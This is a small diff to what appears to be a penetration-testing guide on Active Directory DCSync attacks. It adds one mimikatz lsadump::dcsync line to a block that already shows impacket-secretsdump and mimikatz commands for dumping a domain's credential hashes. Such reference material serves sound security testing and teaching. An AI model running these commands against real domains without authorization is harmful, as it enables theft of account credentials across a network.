@@ -386,6 +386,7 @@ You need at least `ReplicatingDirectoryChanges` and `[...]All` to perform a Doma
 
 ```
 $ impacket-secretsdump -outputfile example_hashes -just-dc example.com/username:password@DCIP
+mimikatz> lsadump::dcsync /user:example\username
 mimikatz> lsadump::dcsync /domain:example.com /user:example\username
 ```
 </div></div>
